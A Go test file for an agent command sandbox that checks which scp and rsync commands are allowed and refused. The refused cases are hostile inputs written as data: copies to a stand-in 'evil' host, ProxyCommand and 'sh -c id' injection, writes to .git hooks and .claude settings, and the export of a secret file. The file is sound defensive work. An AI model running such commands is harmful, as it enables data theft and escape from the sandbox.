package bash_sandboxed

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/gartnera/lite-sandbox/config"
)

// newTestSandboxWithCopyHosts lists box (writes allowed), ro (read-only), and
// jump (read-only).
func newTestSandboxWithCopyHosts(mode config.Mode) *Sandbox {
	write := true
	return newTestSandboxWithConfig(&config.Config{Mode: string(mode), SSH: &config.SSHConfig{Hosts: []config.SSHHost{
		{Host: "box", Write: &write},
		{Host: "ro"},
		{Host: "jump"},
		{Host: "::1", Write: &write},
	}}})
}

// outsideFile returns an existing file outside the sandbox's paths: an
// absolute read path that does not exist is let through.
func outsideFile(t *testing.T) string {
	t.Helper()
	f := filepath.Join(t.TempDir(), "secret")
	if err := os.WriteFile(f, []byte("token\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	return f
}

func runCopyCases(t *testing.T, s *Sandbox, dir string, tests []struct {
	command   string
	errSubstr string
}) {
	t.Helper()
	paths := []string{dir}
	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			err := s.ValidateCommand(tt.command, dir, paths, paths)
			if tt.errSubstr == "" {
				if err != nil {
					t.Fatalf("unexpected error: %v", err)
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), tt.errSubstr) {
				t.Fatalf("error = %v, want one containing %q", err, tt.errSubstr)
			}
		})
	}
}

func TestValidateSCPCommand(t *testing.T) {
	dir := t.TempDir()
	outside := outsideFile(t)
	outsideDir := filepath.Dir(outside)
	s := newTestSandboxWithCopyHosts(config.ModeAllowlist)
	runCopyCases(t, s, dir, []struct {
		command   string
		errSubstr string
	}{
		{command: "scp file.txt box:"},
		{command: "scp file.txt box:/srv/app/"},
		{command: "scp ./a ./b me@box:/tmp"},
		{command: "scp box:/var/log/app.log ."},
		{command: "scp box:/var/log/app.log ./logs/"},
		{command: "scp -r box:/etc/nginx ./nginx"},
		{command: "scp -P 2222 -p -q -C -v box:f ."},
		{command: "scp -o ConnectTimeout=5 -o BatchMode=yes f box:"},
		{command: "scp -J jump f box:"},
		{command: "scp -o ProxyJump=jump f box:"},
		{command: "scp -i ./id_test f box:"},
		{command: "scp -F none f box:"},
		{command: "scp -O -l 1000 -X nrequests=8 f box:"},
		{command: "scp scp://me@box:2222/srv/f ."},
		{command: "scp scp://box/f ."},
		{command: "scp f '[::1]:/tmp/'"},
		{command: "scp f 'me@[::1]:/tmp/'"},
		{command: "scp box:a box:b"},
		{command: "scp -3 box:a box:b"},
		{command: "scp f ./g"},                  // local to local
		{command: "scp -- -f box:"},             // a file named -f
		{command: "scp ./x:y box:"},             // a slash before the colon: local
		{command: "scp :leading box:"},          // a leading colon is part of the name
		{command: "scp 'box:/var/log/*.log' ."}, // the remote glob is quoted
		{command: "scp box:/var/log/*.log ."},   // after a /: no option, no host
		{command: "scp f"},                      // usage

		{command: "scp f ro:", errSubstr: `scp with "ro" is not allowed: scp and rsync copy only to and from ssh hosts that allow writes`},
		{command: "scp ro:/etc/hostname .", errSubstr: "config ssh hosts add ro --write"},
		{command: "scp f evil:", errSubstr: `scp with "evil" is not allowed: it is not one of the ssh hosts`},
		{command: "scp f me@evil:/tmp", errSubstr: `"evil"`},
		{command: "scp scp://evil/f .", errSubstr: `"evil"`},
		{command: "scp scp://box@evil/f .", errSubstr: `"evil"`},
		{command: "scp box:a evil:b", errSubstr: `"evil"`},
		{command: "scp -J evil f box:", errSubstr: `scp through "evil" is not allowed`},
		{command: "scp -o ProxyJump=evil f box:", errSubstr: `"evil"`},
		{command: "scp -S ./prog f box:", errSubstr: "-S is not allowed"},
		{command: "scp -D /usr/lib/sftp-server f box:", errSubstr: "-D is not allowed"},
		{command: "scp -A f box:", errSubstr: "-A is not allowed"},
		{command: "scp -t .", errSubstr: "server mode"},
		{command: "scp -f x", errSubstr: "server mode"},
		{command: "scp -F ./cfg f box:", errSubstr: "-F ./cfg is not allowed"},
		{command: "scp -o ProxyCommand=sh f box:", errSubstr: "ProxyCommand"},
		{command: "scp -o 'LocalCommand id' f box:", errSubstr: "LocalCommand"},
		{command: "scp -Z f box:", errSubstr: "unknown option"},
		{command: "scp -r ./dir box:", errSubstr: "scp -r from a local directory is not allowed"},
		{command: "scp -rp ./dir box:", errSubstr: "scp -r from a local directory"},
		{command: "scp * box:", errSubstr: "unquoted glob"},
		{command: "scp f{,x} box:", errSubstr: "unquoted glob"},
		{command: "H=evil; scp f $H:", errSubstr: "variable"},
		{command: "scp " + outside + " box:", errSubstr: "outside"},
		{command: "scp box:f " + outsideDir, errSubstr: "outside"},
		{command: "scp -i " + outside + " f box:", errSubstr: "outside"},
		{command: "scp box:f .claude/settings.json", errSubstr: ".claude"},
		{command: "scp f .git/hooks/pre-commit", errSubstr: ".git"},
	})
}

func TestValidateRsyncCommand(t *testing.T) {
	dir := t.TempDir()
	outside := outsideFile(t)
	outsideDir := filepath.Dir(outside)
	s := newTestSandboxWithCopyHosts(config.ModeAllowlist)
	runCopyCases(t, s, dir, []struct {
		command   string
		errSubstr string
	}{
		{command: "rsync -avz --delete ./dist/ box:/srv/app/"},
		{command: "rsync -av box:/var/log/app/ ./logs/"},
		{command: "rsync -a me@box:/srv/a :/srv/b ./copy/"},
		{command: "rsync -a box:/srv/a box:/srv/b ./copy/"},
		{command: "rsync box:/srv/"}, // lists
		{command: "rsync box:/srv/a :/srv/b"},
		{command: "rsync -a -e ssh ./d box:"},
		{command: "rsync -a -e 'ssh -p 2222 -o BatchMode=yes' ./d box:"},
		{command: "rsync -a --rsh='ssh -J jump' ./d box:"},
		{command: "rsync -a -e 'ssh -i ./id_test' ./d box:"},
		{command: "rsync -aessh ./d box:"},
		{command: "rsync -a ./d box: --exclude=node_modules/ --exclude '*.o'"},
		{command: "rsync -a --exclude-from=./excludes ./d box:"},
		{command: "rsync -a --exclude-from=- ./d box:"},
		{command: "rsync -a --files-from=./list box:/srv/ ./copy/"},
		{command: "rsync -a --files-from=- box:/srv/ ./copy/"},
		{command: "rsync -a --files-from=box:/srv/list box:/srv/ ./copy/"},
		{command: "rsync -a --files-from=:/srv/list box:/srv/ ./copy/"},
		{command: "rsync -a -f '- *.tmp' -f '+ src/' ./d box:"},
		{command: "rsync -a --filter='exclude *.o' ./d box:"},
		{command: "rsync -a --log-file=./rsync.log ./d box:"},
		{command: "rsync -a --backup --backup-dir=../backup box:/srv/ ./copy/"},
		{command: "rsync -a --link-dest=../prev box:/srv/ ./copy/"},
		{command: "rsync -a --partial-dir=.rsync-partial box:/srv/ ./copy/"},
		{command: "rsync -a --backup-dir=/tmp/x ./d box:/srv/"}, // on the remote receiver
		{command: "rsync -aL box:/srv/ ./copy/"},                // the remote side follows
		{command: "rsync -aK ./d box:/srv/"},
		{command: "rsync -a --rsync-path='sudo rsync' -M--fake-super ./d box:/srv/"},
		{command: "rsync -a --info=progress2 --stats --bwlimit=1m ./d box:"},
		{command: "rsync -a '[::1]:/srv/' ./copy/"},
		{command: "rsync -a ./src/ ./dst/"}, // local to local
		{command: "rsync -a ./d/*.log box:/srv/"},
		{command: "rsync --version"},
		{command: "rsync -a -- ./-e box:"},

		{command: "rsync -a ./d ro:/srv/", errSubstr: `rsync with "ro" is not allowed: scp and rsync copy only to and from ssh hosts that allow writes`},
		{command: "rsync -a ro:/srv/ ./copy/", errSubstr: `"ro"`},
		{command: "rsync -a ./d evil:/srv/", errSubstr: `rsync with "evil" is not allowed: it is not one of the ssh hosts`},
		{command: "rsync -a box:/srv/a evil:/srv/b ./copy/", errSubstr: `"evil"`},
		{command: "rsync -a ./d me@evil:", errSubstr: `"evil"`},
		{command: "rsync -a --files-from=evil:/list box:/srv/ ./copy/", errSubstr: `"evil"`},
		{command: "rsync -a -e 'ssh -J evil' ./d box:", errSubstr: `rsync through "evil" is not allowed`},
		{command: "rsync -a -e 'sh -c id' ./d box:", errSubstr: "the remote shell must be ssh"},
		{command: "rsync -a -e 'ssh -o ProxyCommand=sh' ./d box:", errSubstr: "ProxyCommand"},
		{command: "rsync -a -e 'ssh -F ./cfg' ./d box:", errSubstr: "-F ./cfg"},
		{command: "rsync -a -e 'ssh evil' ./d box:", errSubstr: "give ssh only options"},
		{command: `rsync -a -e "ssh -o 'ProxyCommand sh'" ./d box:`, errSubstr: "without quotes"},
		{command: "rsync -a ./d box: -e 'sh -c id'", errSubstr: "the remote shell must be ssh"},
		{command: "rsync -a ./d box: --rsh=sh", errSubstr: "the remote shell must be ssh"},
		{command: "rsync -ae'sh -c id' ./d box:", errSubstr: "the remote shell must be ssh"},
		{command: "rsync -a ./d box::module", errSubstr: "rsync daemon"},
		{command: "rsync -a rsync://box/module ./copy/", errSubstr: "rsync daemon"},
		{command: "rsync -a RSYNC://box/module ./copy/", errSubstr: "rsync daemon"},
		{command: "rsync -a --port=873 ./d box:", errSubstr: "rsync daemon"},
		{command: "rsync -a --password-file=./pw ./d box:", errSubstr: "rsync daemon"},
		{command: "rsync --daemon", errSubstr: "runs an rsync daemon"},
		{command: "rsync --server --sender . x", errSubstr: "server mode"},
		{command: "rsync -a --write-batch=b ./d box:", errSubstr: "batch"},
		{command: "rsync --read-batch=b ./copy/", errSubstr: "batch"},
		{command: "rsync -aL ./d box:", errSubstr: "--copy-links from a local source"},
		{command: "rsync -ak ./d box:", errSubstr: "--copy-dirlinks"},
		{command: "rsync -a --copy-unsafe-links ./d box:", errSubstr: "--copy-unsafe-links"},
		{command: "rsync -aL ./src/ ./dst/", errSubstr: "--copy-links"},
		{command: "rsync -aK box:/srv/ ./copy/", errSubstr: "--keep-dirlinks into a local destination"},
		{command: "rsync -a --trust-sender box:/srv/ ./copy/", errSubstr: "--trust-sender"},
		{command: "rsync -a --partial-dir=../p box:/srv/ ./copy/", errSubstr: "--partial-dir=../p"},
		{command: "rsync -a -F ./d box:", errSubstr: "-F is not allowed"},
		{command: "rsync -a -f '. ./rules' ./d box:", errSubstr: "merges rules"},
		{command: "rsync -a --filter=': /.rsync-filter' ./d box:", errSubstr: "merges rules"},
		{command: "rsync -a --filter='merge /etc/rules' ./d box:", errSubstr: "merges rules"},
		{command: "rsync -a --filter='dir-merge,n- .x' ./d box:", errSubstr: "merges rules"},
		{command: "rsync -a --bogus ./d box:", errSubstr: "unknown option"},
		{command: "rsync -a --rs=sh ./d box:", errSubstr: "unknown option"},
		{command: "rsync -a --archive=1 ./d box:", errSubstr: "takes no value"},
		{command: "rsync * box:", errSubstr: "unquoted glob"},
		{command: "rsync -a box:/srv/ ./copy/ *", errSubstr: "unquoted glob"},
		{command: "rsync -a " + outside + " box:", errSubstr: "outside"},
		{command: "rsync -a box:/srv/ " + outsideDir, errSubstr: "outside"},
		{command: "rsync -a --exclude-from=" + outside + " ./d box:", errSubstr: "outside"},
		{command: "rsync -a --files-from=" + outside + " box:/srv/ ./copy/", errSubstr: "outside"},
		// The listed names are read unchecked from a local source, through
		// any symlinked directory in their paths.
		{command: "rsync -a --files-from=./list ./ box:/srv/", errSubstr: "--files-from=./list from a local source is not allowed"},
		{command: "rsync -a --files-from=- ./ box:/srv/", errSubstr: "--files-from=- from a local source is not allowed"},
		{command: "rsync -a --files-from=box:/srv/list ./ box:/srv/", errSubstr: "from a local source is not allowed"},
		{command: "rsync -a --log-file=" + outsideDir + "/log ./d box:", errSubstr: "outside"},
		{command: "rsync -a --backup-dir=" + outsideDir + " box:/srv/ ./copy/", errSubstr: "outside"},
		{command: "rsync -a --backup-dir=../../.. box:/srv/ ./copy/", errSubstr: "outside"},
		{command: "rsync -a --temp-dir=" + outsideDir + " box:/srv/ ./copy/", errSubstr: "outside"},
		{command: "rsync -a --link-dest=" + outsideDir + " box:/srv/ ./copy/", errSubstr: "outside"},
		{command: "rsync -a --compare-dest=" + outsideDir + " box:/srv/ ./copy/", errSubstr: "outside"},
		{command: "rsync -a ./d " + outsideDir, errSubstr: "outside"},
		{command: "rsync -a --remove-source-files " + outside + " box:", errSubstr: "outside"},
		{command: "rsync -a box:/srv/ .claude/", errSubstr: ".claude"},
		{command: "rsync -a box:/srv/ ./.git/", errSubstr: ".git"},
		{command: "RSYNC_RSH=sh rsync -a ./d box:", errSubstr: "setting RSYNC_RSH is not allowed"},
		{command: "export RSYNC_PARTIAL_DIR=/tmp; rsync -a --partial box:/srv/ ./copy/", errSubstr: "RSYNC_PARTIAL_DIR"},
		{command: "env RSYNC_CONNECT_PROG=sh rsync -a ./d box:", errSubstr: "RSYNC_CONNECT_PROG"},
	})
}

// TestCopyUnderSSHPassAndWrappers: sshpass may run scp and rsync, checked as
// they are; xargs and find -exec may not, since their input could add an
// option or a host.
func TestCopyUnderSSHPassAndWrappers(t *testing.T) {
	dir := t.TempDir()
	s := newTestSandboxWithCopyHosts(config.ModeAllowlist)
	runCopyCases(t, s, dir, []struct {
		command   string
		errSubstr string
	}{
		{command: "sshpass -e scp f box:"},
		{command: "sshpass -e rsync -a ./d box:/srv/"},
		{command: "sshpass -e rsync -a ./d ro:/srv/", errSubstr: `"ro"`},
		{command: "sshpass -e scp -S ./x f box:", errSubstr: "-S is not allowed"},
		{command: "sshpass -e rsync * box:", errSubstr: "unquoted glob"},
		{command: "timeout 60 rsync -a ./d box:"},
		{command: "timeout 60 rsync -a ./d evil:", errSubstr: `"evil"`},
		{command: "env HOME=/tmp rsync -a ./d box:", errSubstr: "env HOME=... rsync is not allowed"},
		{command: "env HOME=. timeout 60 sshpass -e rsync -a ./d box:", errSubstr: "env HOME=... rsync is not allowed"},
		{command: "env HOME=. timeout 60 scp ./d box:"},
		{command: "xargs rsync -a -t box:/srv/", errSubstr: "xargs rsync is not allowed"},
		{command: "xargs -I{} scp {} box:", errSubstr: "xargs scp is not allowed"},
		{command: "xargs sshpass -e rsync ./d box:", errSubstr: "xargs rsync is not allowed"},
		{command: `find . -name '*.log' -exec scp {} box: \;`, errSubstr: "find -exec scp is not allowed"},
	})
	// sshpass running scp needs a host that allows writes, like scp itself.
	ro := newTestSandboxWithSSH("ro")
	if err := ro.ValidateCommand("sshpass -e scp f ro:", dir, []string{dir}, []string{dir}); err == nil || !strings.Contains(err.Error(), "--write") {
		t.Errorf("sshpass scp without a write host: %v", err)
	}
}

// TestCopyWhitelist: scp and rsync are whitelisted once a host allows
// writes; before that allowlist mode names the remedy, and denylist mode
// without hosts runs them as before.
func TestCopyWhitelist(t *testing.T) {
	dir := t.TempDir()
	paths := []string{dir}
	for _, s := range []*Sandbox{newTestSandbox(), newTestSandboxWithSSH("ro")} {
		for _, cmd := range []string{"scp f box:", "rsync -a ./d box:"} {
			err := s.ValidateCommand(cmd, dir, paths, paths)
			if err == nil || !strings.Contains(err.Error(), "config ssh hosts add <host> --write") {
				t.Errorf("%s without a write host: %v", cmd, err)
			}
		}
	}
	deny := newTestSandboxWithConfig(&config.Config{Mode: string(config.ModeDenylist)})
	if err := deny.ValidateCommand("rsync -aL -e 'sh -c id' ./d anyhost:", dir, paths, paths); err != nil {
		t.Errorf("denylist mode without an ssh section: %v", err)
	}
	// Listing hosts holds denylist mode to the ones that allow writes.
	denyHosts := newTestSandboxWithCopyHosts(config.ModeDenylist)
	for _, cmd := range []string{"rsync -a ./d anyhost:", "scp f ro:"} {
		if err := denyHosts.ValidateCommand(cmd, dir, paths, paths); err == nil {
			t.Errorf("denylist mode with hosts listed allowed %s", cmd)
		}
	}
	if err := denyHosts.ValidateCommand("rsync -a ./src/ ./dst/", dir, paths, paths); err != nil {
		t.Errorf("denylist mode, local rsync: %v", err)
	}
}

// TestCopyAgentScope: scp and rsync go to the ssh agent's worker once a host
// allows writes.
func TestCopyAgentScope(t *testing.T) {
	s := newTestSandboxWithCopyHosts(config.ModeAllowlist)
	s.SetSSHAgent(&fakeAgentProxy{socket: "/run/proxy.sock"}, "/run/agent.sock")
	for _, args := range [][]string{{"scp", "f", "box:"}, {"rsync", "-a", "./d", "box:"}, {"sshpass", "-e", "rsync", "./d", "box:"}} {
		if !s.routedToAgent(args) {
			t.Errorf("%v not routed to the agent's worker", args)
		}
	}
	ro := newTestSandboxWithSSH("ro")
	ro.SetSSHAgent(&fakeAgentProxy{socket: "/run/proxy.sock"}, "/run/agent.sock")
	if ro.routedToAgent([]string{"rsync", "-a", "./d", "ro:"}) {
		t.Error("rsync routed to the agent's worker without a write host")
	}
}

func TestRsyncOperand(t *testing.T) {
	tests := []struct {
		word           string
		remote, daemon bool
		host           string
	}{
		{word: "dir/file"},
		{word: "file"},
		{word: "./a:b"},
		{word: "box:/srv", remote: true, host: "box"},
		{word: "me@box:", remote: true, host: "box"},
		{word: "a@b@box:x", remote: true, host: "box"},
		{word: ":rel", remote: true},
		{word: "box::mod", remote: true, daemon: true, host: "box"},
		{word: "rsync://box/mod", remote: true, daemon: true},
		{word: "[::1]:/srv", remote: true, host: "::1"},
		{word: "me@[fe80::1]:x", remote: true, host: "fe80::1"},
		{word: "a[b:c"},
		{word: "[::1]"},
		{word: "[::1]x:y"},
	}
	for _, tt := range tests {
		o := rsyncOperand(tt.word)
		if o.remote != tt.remote || o.daemon != tt.daemon || o.host != tt.host {
			t.Errorf("rsyncOperand(%q) = %+v", tt.word, o)
		}
	}
}

func TestSCPOperand(t *testing.T) {
	tests := []struct {
		word   string
		remote bool
		host   string
	}{
		{word: "file"},
		{word: "dir/a:b"},
		{word: ":file"},
		{word: "box:", remote: true, host: "box"},
		{word: "me@box:/x", remote: true, host: "box"},
		{word: "a@b@box:/x", remote: true, host: "box"},
		{word: "[::1]:/x", remote: true, host: "::1"},
		{word: "me@[::1]:/x", remote: true, host: "::1"},
		{word: "scp://box/x", remote: true, host: "box"},
		{word: "scp://me@box:22/x", remote: true, host: "box"},
		{word: "scp://[::1]:22/x", remote: true, host: "::1"},
		{word: "scp://me@evil@box/x", remote: true, host: "evil@box"},
	}
	for _, tt := range tests {
		o := scpOperand(tt.word)
		if o.remote != tt.remote || o.host != tt.host {
			t.Errorf("scpOperand(%q) = %+v", tt.word, o)
		}
	}
}

// TestCopyRuntimeValidation: a quoted word's path is checked once the runtime
// layer has expanded it, and a word known only after expansion is refused.
func TestCopyRuntimeValidation(t *testing.T) {
	dir := t.TempDir()
	paths := []string{dir}
	outside := outsideFile(t)
	s := newTestSandboxWithCopyHosts(config.ModeAllowlist)
	for cmd, want := range map[string]string{
		"rsync -a -e 'ssh -i " + outside + "' ./d box:": "outside",
		"scp '" + outside + "' box:":                    "outside",
		`H=evil; rsync -a ./d "$H":`:                    "variable",
		`E='sh -c id'; rsync -a -e "$E" ./d box:`:       "variable",
	} {
		_, err := s.Execute(context.Background(), cmd, dir, paths, paths)
		if err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%s: %v, want %q", cmd, err, want)
		}
	}
}

// TestStripRsyncHome: rsync, run directly or by sshpass, gets no $HOME, from
// which popt would read option aliases.
func TestStripRsyncHome(t *testing.T) {
	for _, args := range [][]string{
		{"rsync", "-a", "./d", "box:"},
		{"sshpass", "-e", "rsync", "./d", "box:"},
		{"timeout", "60", "rsync", "./d", "box:"},
		{"nice", "-n", "5", "env", "TZ=UTC", "sshpass", "-e", "rsync", "./d", "box:"},
	} {
		env := map[string]string{"HOME": "/h", "PATH": "/bin"}
		stripRsyncHome(args, env)
		if _, ok := env["HOME"]; ok || env["PATH"] != "/bin" {
			t.Errorf("%v: %v", args, env)
		}
	}
	for _, args := range [][]string{{"scp", "f", "box:"}, {"sshpass", "-e", "ssh", "box"}, {"timeout", "60", "ls"}, {"ls"}} {
		env := map[string]string{"HOME": "/h"}
		stripRsyncHome(args, env)
		if env["HOME"] != "/h" {
			t.Errorf("%v lost HOME", args)
		}
	}
}
